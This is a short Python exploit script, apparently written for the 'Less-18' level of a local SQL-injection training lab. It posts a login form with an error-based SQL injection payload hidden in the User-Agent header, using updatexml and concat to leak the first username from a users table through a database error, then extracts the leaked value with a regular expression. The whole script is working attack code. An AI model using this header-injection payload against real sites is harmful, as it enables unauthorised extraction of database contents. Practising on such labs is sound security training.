import re
import string
import requests

url='http://localhost/Less-18/'

# XPATH injection
# Error based injection


data={
	"uname":"admin",
	"passwd":"admin",
	"submit":"Submit"
}

header={
	"User-Agent":"' and updatexml(1,concat('==',(select username from users limit 0,1),'=='),1),1,1)#"
}

resp=requests.post(url,data=data , headers=header)
print(resp.text)
matches=re.findall("error: '==(.*)==",resp.text)
print(matches)